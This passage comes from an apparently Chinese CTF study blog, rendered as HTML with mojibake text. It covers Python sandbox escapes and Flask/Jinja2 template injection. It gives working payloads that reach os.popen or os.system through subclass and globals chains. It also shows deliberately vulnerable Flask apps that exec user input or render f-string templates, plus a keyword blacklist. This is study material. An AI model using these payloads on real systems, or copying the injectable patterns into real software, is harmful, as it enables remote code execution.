class="string">&quot;&#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>os._wrap_close</strong>åœ¨os.pyé‡Œå®šä¹‰ï¼Œä»–çš„initå‡½æ•°globalså±æ€§è·å–åˆ°çš„å…¨å±€å˜é‡ä¸å‡½æ•°åŒ…æ‹¬åœ¨os.pyé‡Œå®šä¹‰çš„ï¼Œæœ‰system,popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>warnings.catch_warnings</strong>ç±»åœ¨åœ¨å†…éƒ¨å®šä¹‰äº†_module&#x3D;sys.modules[â€˜warningsâ€™]ï¼Œç„¶åwarningsæ¨¡å—åŒ…å«æœ‰__builtins__(å¾ˆå¤šæ¨¡å—éƒ½åŒ…å«builtinså§)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&#x27;catch_warnings&#x27;</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;cat ../flag templates/rce.html&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="7-å¤å†™å‡½æ•°"><a href="#7-å¤å†™å‡½æ•°" class="headerlink" title="7.å¤å†™å‡½æ•°"></a>7.å¤å†™å‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> render_template;render_template=<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="é¢˜ç›®ï¼špythonæ²™ç®±2"><a href="#é¢˜ç›®ï¼špythonæ²™ç®±2" class="headerlink" title="é¢˜ç›®ï¼špythonæ²™ç®±2"></a>é¢˜ç›®ï¼špythonæ²™ç®±2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rce&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        restricted_globals = &#123;</span><br><span class="line">             <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exec</span>(code, restricted_globals)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rce.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>æ²™ç®±é‡Œæ²¡æœ‰å…¨å±€å˜é‡å…¨å±€å‡½æ•°ï¼ˆbuiltinçš„ï¼Œflaskçš„éƒ½æ²¡ï¼‰ï¼Œåˆ©ç”¨ç»§æ‰¿å…³ç³»é€ƒé€¸</p><h2 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h2><p><img src="C:\Users\tiand\AppData\Roaming\Typora\typora-user-images\image-20250118152124960.png" alt="image-20250118152124960"></p><p>SSTI æ˜¯æŒ‡é€šè¿‡æ¨¡æ¿å¼•æ“ï¼ˆå¦‚ Jinja2ï¼‰æ‰§è¡Œæ¶æ„æ¨¡æ¿è¯­æ³•ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´ã€‚åœ¨ Flask ä¸­ï¼ŒJinja2 æ˜¯é»˜è®¤çš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒçš„è¯­æ³•å…è®¸åŠ¨æ€ç”Ÿæˆ HTML å†…å®¹ï¼Œä½†ä¸å½“ä½¿ç”¨æ—¶å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚</p><h3 id="æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­globals-å…¨å±€å˜é‡ä¸å…¨å±€å‡½æ•°"><a href="#æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­globals-å…¨å±€å˜é‡ä¸å…¨å±€å‡½æ•°" class="headerlink" title="æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­globals(å…¨å±€å˜é‡ä¸å…¨å±€å‡½æ•°)"></a>æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­globals(å…¨å±€å˜é‡ä¸å…¨å±€å‡½æ•°)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    jinja_globals = app.jinja_env.<span class="built_in">globals</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(jinja_globals)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jinja_globals&quot;</span></span><br><span class="line"><span class="comment">#è·å–æ²™ç®±ä¸­å…¨å±€å˜é‡å…¨å±€å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;range&#x27;<span class="punctuation">:</span> &lt;class &#x27;range&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;dict&#x27;<span class="punctuation">:</span> &lt;class &#x27;dict&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;lipsum&#x27;<span class="punctuation">:</span> &lt;function generate_lorem_ipsum at <span class="number">0x000002049AACD800</span>&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;cycler&#x27;<span class="punctuation">:</span> &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;joiner&#x27;<span class="punctuation">:</span> &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;namespace&#x27;<span class="punctuation">:</span> &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;url_for&#x27;<span class="punctuation">:</span> &lt;bound method Flask.url_for of &lt;Flask &#x27;test&#x27;&gt;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;get_flashed_messages&#x27;<span class="punctuation">:</span> &lt;function get_flashed_messages at <span class="number">0x000002049B62F740</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"></span><br><span class="line">&#x27;config&#x27;<span class="punctuation">:</span> &lt;Config <span class="punctuation">&#123;</span>&#x27;DEBUG&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;TESTING&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;PROPAGATE_EXCEPTIONS&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SECRET_KEY&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span>    &#x27;PERMANENT_SESSION_LIFETIME&#x27;<span class="punctuation">:</span> datetime.timedelta(days=<span class="number">31</span>)<span class="punctuation">,</span> &#x27;USE_X_SENDFILE&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;SERVER_NAME&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;APPLICATION_ROOT&#x27;<span class="punctuation">:</span> &#x27;/&#x27;<span class="punctuation">,</span> &#x27;SESSION_COOKIE_NAME&#x27;<span class="punctuation">:</span> &#x27;session&#x27;<span class="punctuation">,</span> &#x27;SESSION_COOKIE_DOMAIN&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SESSION_COOKIE_PATH&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SESSION_COOKIE_HTTPONLY&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;SESSION_COOKIE_SECURE&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;SESSION_COOKIE_SAMESITE&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;MAX_CONTENT_LENGTH&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;TRAP_HTTP_EXCEPTIONS&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;PREFERRED_URL_SCHEME&#x27;<span class="punctuation">:</span> &#x27;http&#x27;<span class="punctuation">,</span> &#x27;TEMPLATES_AUTO_RELOAD&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;MAX_COOKIE_SIZE&#x27;<span class="punctuation">:</span> <span class="number">4093</span><span class="punctuation">&#125;</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"></span><br><span class="line">&#x27;request&#x27;<span class="punctuation">:</span> &lt;Request &#x27;http<span class="punctuation">:</span><span class="comment">//127.0.0.1:5000/&#x27; [GET]&gt;, </span></span><br><span class="line">&#x27;session&#x27;<span class="punctuation">:</span> &lt;NullSession <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;g&#x27;<span class="punctuation">:</span> &lt;flask.g of &#x27;test&#x27;&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­è¿‡æ»¤å™¨"><a href="#æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­è¿‡æ»¤å™¨" class="headerlink" title="æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­è¿‡æ»¤å™¨"></a>æŸ¥çœ‹flaskçš„jinja2æ²™ç®±ä¸­è¿‡æ»¤å™¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    jinja_filters = app.jinja_env.filters</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(jinja_filters)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jinja_filters&quot;</span></span><br><span class="line"><span class="comment">#è·å–å¯ç”¨è¿‡æ»¤å™¨</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;abs&#x27;<span class="punctuation">:</span> &lt;built-in function abs&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;attr&#x27;<span class="punctuation">:</span> &lt;function do_attr at <span class="number">0x00000216DF1E0180</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;batch&#x27;<span class="punctuation">:</span> &lt;function do_batch at <span class="number">0x00000216DF1DAE80</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;capitalize&#x27;<span class="punctuation">:</span> &lt;function do_capitalize at <span class="number">0x00000216DF1D99E0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;center&#x27;<span class="punctuation">:</span> &lt;function do_center at <span class="number">0x00000216DF1DA020</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;count&#x27;<span class="punctuation">:</span> &lt;built-in function len&gt;<span class="punctuation">,</span> &#x27;d&#x27;<span class="punctuation">:</span> &lt;function do_default at <span class="number">0x00000216DF1D9EE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;default&#x27;<span class="punctuation">:</span> &lt;function do_default at <span class="number">0x00000216DF1D9EE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;dictsort&#x27;<span class="punctuation">:</span> &lt;function do_dictsort at <span class="number">0x00000216DF1D9B20</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;e&#x27;<span class="punctuation">:</span> &lt;built-in function escape&gt;<span class="punctuation">,</span> &#x27;escape&#x27;<span class="punctuation">:</span> &lt;built-in function escape&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;filesizeformat&#x27;<span class="punctuation">:</span> &lt;function do_filesizeformat at <span class="number">0x00000216DF1DA660</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;first&#x27;<span class="punctuation">:</span> &lt;function do_first at <span class="number">0x00000216DF1DA520</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;float&#x27;<span class="punctuation">:</span> &lt;function do_float at <span class="number">0x00000216DF1DAB60</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;forceescape&#x27;<span class="punctuation">:</span> &lt;function do_forceescape at <span class="number">0x00000216DF1D9580</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;format&#x27;<span class="punctuation">:</span> &lt;function do_format at <span class="number">0x00000216DF1DAC00</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;groupby&#x27;<span class="punctuation">:</span> &lt;function do_groupby at <span class="number">0x00000216DF1DB880</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;indent&#x27;<span class="punctuation">:</span> &lt;function do_indent at <span class="number">0x00000216DF1DA840</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;int&#x27;<span class="punctuation">:</span> &lt;function do_int at <span class="number">0x00000216DF1DAAC0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;join&#x27;<span class="punctuation">:</span> &lt;function do_join at <span class="number">0x00000216DF1DA200</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;last&#x27;<span class="punctuation">:</span> &lt;function do_last at <span class="number">0x00000216DF1DA340</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;length&#x27;<span class="punctuation">:</span> &lt;built-in function len&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;list&#x27;<span class="punctuation">:</span> &lt;function do_list at <span class="number">0x00000216DF1DBD80</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;lower&#x27;<span class="punctuation">:</span> &lt;function do_lower at <span class="number">0x00000216DF1D9800</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;items&#x27;<span class="punctuation">:</span> &lt;function do_items at <span class="number">0x00000216DF1D98A0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;map&#x27;<span class="punctuation">:</span> &lt;function do_map at <span class="number">0x00000216DF1E0860</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;min&#x27;<span class="punctuation">:</span> &lt;function do_min at <span class="number">0x00000216DF1D9DA0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;max&#x27;<span class="punctuation">:</span> &lt;function do_max at <span class="number">0x00000216DF1D9E40</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;pprint&#x27;<span class="punctuation">:</span> &lt;function do_pprint at <span class="number">0x00000216DF1DA700</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;random&#x27;<span class="punctuation">:</span> &lt;function do_random at <span class="number">0x00000216DF1DA5C0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;reject&#x27;<span class="punctuation">:</span> &lt;function do_reject at <span class="number">0x00000216DF1E0D60</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;rejectattr&#x27;<span class="punctuation">:</span> &lt;function do_rejectattr at <span class="number">0x00000216DF1E1260</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;replace&#x27;<span class="punctuation">:</span> &lt;function do_replace at <span class="number">0x00000216DF1D96C0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;reverse&#x27;<span class="punctuation">:</span> &lt;function do_reverse at <span class="number">0x00000216DF1E00E0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;round&#x27;<span class="punctuation">:</span> &lt;function do_round at <span class="number">0x00000216DF1DB100</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;safe&#x27;<span class="punctuation">:</span> &lt;function do_mark_safe at <span class="number">0x00000216DF1DBBA0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;select&#x27;<span class="punctuation">:</span> &lt;function do_select at <span class="number">0x00000216DF1E0AE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;selectattr&#x27;<span class="punctuation">:</span> &lt;function do_selectattr at <span class="number">0x00000216DF1E0FE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;slice&#x27;<span class="punctuation">:</span> &lt;function do_slice at <span class="number">0x00000216DF1DB060</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;sort&#x27;<span class="punctuation">:</span> &lt;function do_sort at <span class="number">0x00000216DF1D9BC0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;string&#x27;<span class="punctuation">:</span> &lt;built-in function soft_str&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;striptags&#x27;<span class="punctuation">:</span> &lt;function do_striptags at <span class="number">0x00000216DF1DAD40</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;sum&#x27;<span class="punctuation">:</span> &lt;function do_sum at <span class="number">0x00000216DF1DBB00</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;title&#x27;<span class="punctuation">:</span> &lt;function do_title at <span class="number">0x00000216DF1D9A80</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;trim&#x27;<span class="punctuation">:</span> &lt;function do_trim at <span class="number">0x00000216DF1DACA0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;truncate&#x27;<span class="punctuation">:</span> &lt;function do_truncate at <span class="number">0x00000216DF1DA8E0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;unique&#x27;<span class="punctuation">:</span> &lt;function do_unique at <span class="number">0x00000216DF1D9C60</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;upper&#x27;<span class="punctuation">:</span> &lt;function do_upper at <span class="number">0x00000216DF1D9760</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;urlencode&#x27;<span class="punctuation">:</span> &lt;function do_urlencode at <span class="number">0x00000216DF1D9620</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;urlize&#x27;<span class="punctuation">:</span> &lt;function do_urlize at <span class="number">0x00000216DF1DA7A0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;wordcount&#x27;<span class="punctuation">:</span> &lt;function do_wordcount at <span class="number">0x00000216DF1DAA20</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;wordwrap&#x27;<span class="punctuation">:</span> &lt;function do_wordwrap at <span class="number">0x00000216DF1DA980</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;xmlattr&#x27;<span class="punctuation">:</span> &lt;function do_xmlattr at <span class="number">0x00000216DF1D9940</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;tojson&#x27;<span class="punctuation">:</span> &lt;function do_tojson at <span class="number">0x00000216DF1E1080</span>&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="é¢˜ç›®ï¼špython-ssti1"><a href="#é¢˜ç›®ï¼špython-ssti1" class="headerlink" title="é¢˜ç›®ï¼špython ssti1"></a>é¢˜ç›®ï¼špython ssti1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">f&#x27;&lt;h1&gt;<span class="subst">&#123;name&#125;</span> is sb&lt;/h1&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>)</span><br><span class="line">    <span class="comment">#æ²¡å›æ˜¾æ€ä¹ˆåŠ(æ¯”å¦‚æœ€åä¸€å¥æ¢æˆ)</span></span><br><span class="line">    <span class="comment">#render_template_string(str)</span></span><br><span class="line">    <span class="comment">#return &#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢˜ç›®ï¼špython-ssti2"><a href="#é¢˜ç›®ï¼špython-ssti2" class="headerlink" title="é¢˜ç›®ï¼špython ssti2"></a>é¢˜ç›®ï¼špython ssti2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        blacklist = [<span class="string">&#x27;__&#x27;</span>,<span class="string">&#x27;builtin&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;app&#x27;</span>,<span class="string">&#x27;url_for&#x27;</span>,<span class="string">&#x27;get_flashed_messages&#x27;</span>,<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(i <span class="keyword">in</span> name <span class="keyword">for</span> i <span class="keyword">in</span> blacklist):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;æ»šä¸«&#x27;</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">f&#x27;&lt;h1&gt;<span class="subst">&#123;name&#125;</span> is sb&lt;/h1&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>)</span><br><span class="line">        <span class="comment">#æ²¡å›æ˜¾æ€ä¹ˆåŠ(æ¯”å¦‚æœ€åä¸€å¥æ¢æˆ)</span></span><br><span class="line">        <span class="comment">#render_template_string(str)</span></span><br><span class="line">        <span class="comment">#return &#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 